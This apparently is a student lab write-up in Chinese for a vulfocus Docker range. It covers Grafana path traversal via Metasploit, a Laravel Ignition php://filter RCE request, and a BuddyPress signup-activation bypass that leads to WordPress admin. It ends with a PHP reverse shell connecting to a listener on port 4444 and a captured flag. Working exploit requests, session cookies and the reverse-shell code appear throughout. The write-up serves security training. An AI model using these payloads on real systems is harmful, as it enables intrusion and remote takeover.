docker pull vulfocus/grafana-cve_2021_43798:latest

docker pull vulfocus/thinkphp-cve_2018_1002015:latest

![1747647427981](image/homework/1747647427981.png)

![1747473863077](image/homework/1747473863077.png)

docker pull vulfocus/wordpress_cve_2019_8942:latest
![1747473881917](image/homework/1747473881917.png)

docker pull vulfocus/redis-cnvd_2019_21763:latest
![1747473893030](image/homework/1747473893030.png)

docker pull vulfocus/samba-cve_2017_7494:latest
![1747473905026](image/homework/1747473905026.png)

docker pull c4pr1c3/vulshare_nginx-php-flag:latest

![1747648013574](image/homework/1747648013574.png)

![1747669819472](image/homework/1747669819472.png)
![1747669849781](image/homework/1747669849781.png)
![1747669869640](image/homework/1747669869640.png)

use auxiliary/scanner/http/grafana_plugin_traversal

![1747669887430](image/homework/1747669887430.png)
![1747669914161](image/homework/1747669914161.png)

/home/klai/.msf4/loot/20250519080524_default_192.168.20.12_grafana.loot_087266.db


![1747669961500](image/homework/1747669961500.png)
![1747669973362](image/homework/1747669973362.png)
![1747670102255](image/homework/1747670102255.png)

![1747670378674](image/homework/1747670378674.png)
![1747670718439](image/homework/1747670718439.png)



---

```poc
POST /_ignition/execute-solution HTTP/1.1

Host: 192.168.20.12:42094

Content-Type: application/json

Content-Length: 330



{

  "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",

  "parameters": {

    "variableName": "username",

    "viewFile": "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"

  }

}
```
![1747836521377](image/homework/1747836521377.png)

![1747836650050](image/homework/1747836650050.png)


![1747841884668](image/homework/1747841884668.png)


![1747841897994](image/homework/1747841897994.png)



---


![1747885269164](image/homework/1747885269164.png)

activation_key : eYVXLvzFvpEpjN36ktbv0Y1mtLLiCgZa

![1747885509307](image/homework/1747885509307.png)

这里通过使用activation_key能够绕过邮箱激活链接，使攻击者能够直接激活账户

![1747885599121](image/homework/1747885599121.png)

---
```
POST /wp-json/buddypress/v1/signup HTTP/1.1

Host: 192.168.20.12:10459

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0

Accept: */*

Accept-Encoding: gzip, deflate

Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6

Content-Type: application/json; charset=UTF-8

Content-Length: 112



{"user_login": "attcker1", "user_email": "attacker1@163.com", "user_name": "attacker1", "password": "attacker1"}
```

```
HTTP/1.1 200 OK

Date: Thu, 22 May 2025 03:48:36 GMT

Server: Apache/2.4.18 (Ubuntu)

X-Robots-Tag: noindex

Link: <http://192.168.20.12:10459/wp-json/>; rel="https://api.w.org/"

X-Content-Type-Options: nosniff

Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link

Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type

Allow: POST

Content-Length: 280

Content-Type: application/json; charset=UTF-8



[{"id":3,"user_login":"attcker1","registered":"2025-05-22T03:48:36","user_name":"attacker1","activation_key":"aoM0svmO72kVVPbNxYadAKifjIUuYqj8","user_email":"attacker1@163.com","date_sent":"2025-05-22T03:48:36","count_sent":1,"meta":{"field_1":"attacker1","profile_field_ids":1}}]
```

![1747885758997](image/homework/1747885758997.png)
activation_key : aoM0svmO72kVVPbNxYadAKifjIUuYqj8

![1747885790638](image/homework/1747885790638.png)

```
PUT /wp-json/buddypress/v1/signup/activate/aoM0svmO72kVVPbNxYadAKifjIUuYqj8 HTTP/1.1

Host:192.168.20.12:10459

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0

Accept: */*

Accept-Encoding: gzip, deflate

Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6

Content-Type: application/json; charset=UTF-8

Content-Length: 112



{"user_login": "attcker1", "user_email": "attacker1@163.com", "user_name": "attacker1", "password": "attacker1"}
```

```
HTTP/1.1 200 OK

Date: Thu, 22 May 2025 03:49:29 GMT

Server: Apache/2.4.18 (Ubuntu)

X-Robots-Tag: noindex

Link: <http://192.168.20.12:10459/wp-json/>; rel="https://api.w.org/"

X-Content-Type-Options: nosniff

Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link

Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type

Content-Length: 280

Content-Type: application/json; charset=UTF-8



[{"id":3,"user_login":"attcker1","registered":"2025-05-22T03:48:36","user_name":"attacker1","activation_key":"aoM0svmO72kVVPbNxYadAKifjIUuYqj8","user_email":"attacker1@163.com","date_sent":"2025-05-22T03:48:36","count_sent":1,"meta":{"field_1":"attacker1","profile_field_ids":1}}]
```

![1747885902130](image/homework/1747885902130.png)

![1747885938881](image/homework/1747885938881.png)

![1747888798026](image/homework/1747888798026.png)

![1747888866380](image/homework/1747888866380.png)

![1747888878196](image/homework/1747888878196.png)

![1747888898177](image/homework/1747888898177.png)

![1747888916532](image/homework/1747888916532.png)

![1747888936571](image/homework/1747888936571.png)

![1747889012605](image/homework/1747889012605.png)

cookie:
grafana_session=7cee305b146bf89decccac3eb414687f; grafana_session_expiry=1747723015; zbx_sessionid=060b0abb1800d98452c40e735dbb58fa; wp-settings-time-2=1747822280; experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IklqZzRZVGcyWlRWakxUa3dZamN0TkRNMFl5MDVaREF4TFdZME5EZ3haVFptTVdNd01TST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--a69a8d8efbbef8037dbb261a0526aae27fb6c1b8; metabase.DEVICE=0af33864-c7aa-43fd-89aa-287250f4c715; vue_admin_template_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzQ3OTY5MjYzLCJlbWFpbCI6IiJ9.C9VdlIBrcP4xj1g5TzsBWQosumWuAVXLH1S6Lgzk8nI; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_8232bb51e9fa6ae4bed9f94b4ce661c2=attcker1%7C1748062618%7CGvjHpcyFfFhCylwuqLNafXmiHwJqmZ5VldxGcUkR0Bz%7Ca6226440d0bde4fe9d4cf14cce8fcf49dd365c9f342c5296f67044f265433248; wp-settings-time-3=1747889821

X-WP-Nonce:
cb16f80772

![1747889065162](image/homework/1747889065162.png)

![1747890470194](image/homework/1747890470194.png)

![1747890494107](image/homework/1747890494107.png)

有了管理员权限
![1747890528150](image/homework/1747890528150.png)

![1747890547884](image/homework/1747890547884.png)

![1747890578223](image/homework/1747890578223.png)
111222
![1747890605964](image/homework/1747890605964.png)

![1747890820999](image/homework/1747890820999.png)
111222
![1747890861599](image/homework/1747890861599.png)

![1747890872341](image/homework/1747890872341.png)

```php
<?php
$sock = fsockopen("192.168.168.10", 4444);
$proc = proc_open("bash -i", array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>
```
![1747891827132](image/homework/1747891827132.png)

![1747891841145](image/homework/1747891841145.png)

flag为`flag-{bmh9a8fd407-0aac-4b54-995d-4bb306a739f5}`

![1747891890594](image/homework/1747891890594.png)

![1747893446502](image/homework/1747893446502.png)

![1747893462723](image/homework/1747893462723.png)





参考资料 : 
https://www.cnblogs.com/dubh3/p/11561400.html
